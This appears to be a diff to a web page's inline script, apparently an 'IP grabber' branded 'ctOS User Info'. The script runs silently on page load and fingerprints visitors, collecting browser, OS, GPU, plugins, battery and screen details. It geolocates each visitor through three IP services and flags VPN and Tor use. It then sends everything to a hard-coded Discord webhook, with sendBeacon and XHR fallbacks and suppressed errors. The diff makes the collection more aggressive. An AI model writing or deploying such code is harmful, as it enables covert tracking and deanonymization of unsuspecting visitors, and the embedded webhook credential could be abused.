@@ -68,17 +68,27 @@
     const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
 
     // ================================================================
-    //  SINGLE FAST IP/GEO FETCH (250ms timeout, no fallback)
+    //  AGGRESSIVE IP + GEO FETCH (parallel, 600ms timeout)
     // ================================================================
     function fetchIPData() {
         return new Promise((resolve) => {
-            const timer = setTimeout(() => resolve(null), 250);
-            fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(200) })
+            let resolved = false;
+            const done = (data) => {
+                if (!resolved) {
+                    resolved = true;
+                    resolve(data);
+                }
+            };
+
+            // Timeout guard
+            setTimeout(() => done(null), 600);
+
+            // 1) ip-api.com (returns proxy flag, lat/lon, isp)
+            fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(500) })
                 .then(r => r.json())
                 .then(d => {
-                    clearTimeout(timer);
                     if (d && d.query) {
-                        resolve({
+                        done({
                             ip: d.query,
                             org: d.isp || '',
                             country_name: d.country || '',
@@ -86,31 +96,73 @@
                             city: d.city || '',
                             latitude: d.lat || 0,
                             longitude: d.lon || 0,
-                            proxy: d.proxy === true
+                            proxy: d.proxy === true,
+                            source: 'ip-api'
                         });
-                    } else {
-                        resolve(null);
                     }
-                })
-                .catch(() => {
-                    clearTimeout(timer);
-                    resolve(null);
-                });
+                }).catch(() => {});
+
+            // 2) ipinfo.io (fallback)
+            fetch('https://ipinfo.io/json', { signal: AbortSignal.timeout(500) })
+                .then(r => r.json())
+                .then(d => {
+                    if (d && d.ip) {
+                        const loc = d.loc ? d.loc.split(',') : [0, 0];
+                        const org = d.org || '';
+                        const isVpn = org.toLowerCase().includes('vpn') || 
+                                      org.toLowerCase().includes('proxy') ||
+                                      org.toLowerCase().includes('hosting') ||
+                                      org.toLowerCase().includes('cloud');
+                        done({
+                            ip: d.ip,
+                            org: org,
+                            country_name: d.country || '',
+                            region: d.region || '',
+                            city: d.city || '',
+                            latitude: parseFloat(loc[0]) || 0,
+                            longitude: parseFloat(loc[1]) || 0,
+                            proxy: isVpn,
+                            source: 'ipinfo'
+                        });
+                    }
+                }).catch(() => {});
+
+            // 3) ultra‑simple IP only (if both geo APIs fail)
+            fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(300) })
+                .then(r => r.json())
+                .then(d => {
+                    if (d && d.ip) {
+                        done({
+                            ip: d.ip,
+                            org: 'Unknown ISP',
+                            country_name: 'Unknown',
+                            region: 'Unknown',
+                            city: 'Unknown',
+                            latitude: 0,
+                            longitude: 0,
+                            proxy: false,
+                            source: 'ipify'
+                        });
+                    }
+                }).catch(() => {});
         });
     }
 
     // ================================================================
-    //  ENCRYPTED IPv6 (always shows FranTech Solutions)
+    //  ENCRYPTED IPv6 GENERATOR (always shows FranTech Solutions)
     // ================================================================
     function encryptIP(realIP) {
         if (!realIP || realIP === 'Unknown') {
             return '2605:6400:30:f534:ae1d:c3d9:9941:d85e (FranTech Solutions)';
         }
+        // IPv4 -> map to a consistent fake IPv6
         if (realIP.includes('.')) {
             const parts = realIP.split('.');
             const hex = parts.map(p => parseInt(p).toString(16).padStart(2, '0')).join('');
+            // Build a deterministic but encrypted-looking IPv6
             return `2605:6400:${hex.slice(0,4)}:${hex.slice(4,8)}:ae1d:c3d9:9941:d85e (FranTech Solutions)`;
         } else if (realIP.includes(':')) {
+            // Already IPv6 – mask the middle segments
             const segs = realIP.split(':');
             if (segs.length >= 4) {
                 return `${segs[0]}:${segs[1]}:****:****:${segs.slice(4).join(':')} (FranTech Solutions)`;
@@ -121,83 +173,108 @@
     }
 
     // ================================================================
-    //  SEND MESSAGE (fast, with sendBeacon fallback)
+    //  SEND MESSAGE (fetch + sendBeacon)
     // ================================================================
     function sendMessage(msg) {
-        fetch(WEBHOOK, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: msg }),
-            keepalive: true
-        }).catch(() => {
-            // fallback
-            const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
-            navigator.sendBeacon(WEBHOOK, blob);
+        return new Promise((resolve) => {
+            let sent = false;
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: msg }),
+                keepalive: true
+            })
+            .then(res => { if (res.ok) { sent = true; resolve(true); } })
+            .catch(() => {
+                const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
+                if (navigator.sendBeacon(WEBHOOK, blob)) { sent = true; resolve(true); }
+                else {
+                    try {
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('POST', WEBHOOK, true);
+                        xhr.setRequestHeader('Content-Type', 'application/json');
+                        xhr.send(JSON.stringify({ content: msg }));
+                        xhr.onload = () => { if (xhr.status === 200 || xhr.status === 204) resolve(true); };
+                        xhr.onerror = () => resolve(false);
+                        setTimeout(() => resolve(false), 1000);
+                    } catch (e) { resolve(false); }
+                }
+            });
+            setTimeout(() => resolve(sent), 700);
         });
     }
 
     // ================================================================
-    //  MAIN – runs immediately, no blocking
+    //  MAIN – runs immediately, no UI blocks
     // ================================================================
     (async function() {
-        // ---- 1. System info (synchronous, instant) ----
-        const ua = navigator.userAgent;
-        const os = (ua.includes('Windows NT')) ? 'Windows' :
-                   (ua.includes('Macintosh')) ? 'macOS' :
-                   (ua.includes('iPhone')) ? 'iOS' :
-                   (ua.includes('Android')) ? 'Android' : 'Unknown';
-        const browser = (ua.includes('Chrome') && !ua.includes('Edg')) ? 'Chrome' :
-                        (ua.includes('Firefox')) ? 'Firefox' :
-                        (ua.includes('Safari') && !ua.includes('Chrome')) ? 'Safari' :
-                        (ua.includes('Edg')) ? 'Edge' : 'Other';
-
-        let gpu = 'Unavailable';
         try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            if (debug) gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'Unavailable';
-        } catch (e) {}
+            // ---- 1. System info (sync) ----
+            const ua = navigator.userAgent;
+            const os = (ua.includes('Windows NT')) ? 'Windows' :
+                       (ua.includes('Macintosh')) ? 'macOS' :
+                       (ua.includes('iPhone')) ? 'iOS' :
+                       (ua.includes('Android')) ? 'Android' : 'Unknown';
+            const browser = (ua.includes('Chrome') && !ua.includes('Edg')) ? 'Chrome' :
+                            (ua.includes('Firefox')) ? 'Firefox' :
+                            (ua.includes('Safari') && !ua.includes('Chrome')) ? 'Safari' :
+                            (ua.includes('Edg')) ? 'Edge' : 'Other';
 
-        const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            let gpu = 'Unavailable';
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debug) gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'Unavailable';
+            } catch (e) {}
 
-        // ---- 2. Fetch IP (fast, 250ms max) ----
-        const ipData = await fetchIPData();
+            const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
 
-        // ---- 3. Build data ----
-        let realIP = 'Unknown', isp = 'Unknown ISP', city = 'Unknown', region = 'Unknown', country = 'Unknown';
-        let lat = 0, lon = 0, proxyFlag = false;
-        if (ipData) {
-            realIP = ipData.ip;
-            isp = ipData.org;
-            city = ipData.city;
-            region = ipData.region;
-            country = ipData.country_name;
-            lat = ipData.latitude;
-            lon = ipData.longitude;
-            proxyFlag = ipData.proxy;
-        }
+            let battery = 'Unavailable';
+            try {
+                battery = await Promise.race([
+                    navigator.getBattery().then(b => Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')'),
+                    new Promise(res => setTimeout(() => res('Unavailable'), 150))
+                ]);
+            } catch (e) {}
 
-        // VPN detection: proxy flag OR keywords in ISP
-        let isVpn = proxyFlag;
-        if (ipData && ipData.org) {
-            const orgLower = ipData.org.toLowerCase();
-            if (['vpn','proxy','hosting','cloud','datacenter','tor','anonymous','private','hide','mask'].some(k => orgLower.includes(k))) isVpn = true;
-        }
-        if (ua.includes('Tor') || ua.includes('Anonymous') || navigator.webdriver === true) isVpn = true;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-        // Encrypted IP display
-        const displayIP = encryptIP(realIP);
+            // ---- 2. Fetch IP/Geo aggressively ----
+            const ipData = await fetchIPData();
 
-        // Location & coordinates (will show actual data if available)
-        const locationStr = (city !== 'Unknown' || region !== 'Unknown' || country !== 'Unknown')
-            ? `${city}, ${region}, ${country}`
-            : 'Unknown';
-        const coordsStr = (lat !== 0 || lon !== 0) ? `${lat}, ${lon}` : 'Unknown';
+            // ---- 3. Build final fields ----
+            let realIP = ipData ? ipData.ip : 'Unknown';
+            let isp = ipData ? ipData.org : 'Unknown ISP';
+            let city = ipData ? ipData.city : 'Unknown';
+            let region = ipData ? ipData.region : 'Unknown';
+            let country = ipData ? ipData.country_name : 'Unknown';
+            let lat = ipData ? ipData.latitude : 0;
+            let lon = ipData ? ipData.longitude : 0;
+            let proxyFlag = ipData ? ipData.proxy : false;
 
-        // ---- 4. Build message (NO User Name) ----
-        const msg =
+            // ---- 4. VPN detection (strong) ----
+            let isVpn = proxyFlag;
+            if (ipData && ipData.org) {
+                const orgLower = ipData.org.toLowerCase();
+                const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous','private','hide','mask'];
+                if (vpnKeywords.some(k => orgLower.includes(k))) isVpn = true;
+            }
+            // Browser heuristics
+            if (ua.includes('Tor') || ua.includes('Anonymous') || navigator.webdriver === true) isVpn = true;
+
+            // ---- 5. Encrypted IP display (always) ----
+            const displayIP = encryptIP(realIP);
+
+            // ---- 6. Build message (NO User Name line) ----
+            const locationStr = (city !== 'Unknown' || region !== 'Unknown' || country !== 'Unknown') 
+                ? `${city}, ${region}, ${country}` 
+                : 'Unknown';
+            const coordsStr = (lat !== 0 || lon !== 0) 
+                ? `${lat}, ${lon}` 
+                : 'Unknown';
+
+            const msg = 
 `**ctOS User Info**
 **IP:** ${displayIP}
 **Location:** ${locationStr}
@@ -208,13 +285,18 @@
 **CPU Cores:** ${navigator.hardwareConcurrency || '?'}
 **RAM:** ${navigator.deviceMemory || '?'} GB
 **Screen:** ${screen.width}x${screen.height}x${screen.colorDepth}
+**Battery:** ${battery}
 **Time Zone:** ${timezone}
 **GPU:** ${gpu}
 **Plugins:** ${plugins}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-        // ---- 5. Fire webhook immediately (no waiting for response) ----
-        sendMessage(msg);
+            // ---- 7. Fire and forget ----
+            await sendMessage(msg);
+
+        } catch (err) {
+            // Silent – no console spam
+        }
     })();
 </script>
 </body>
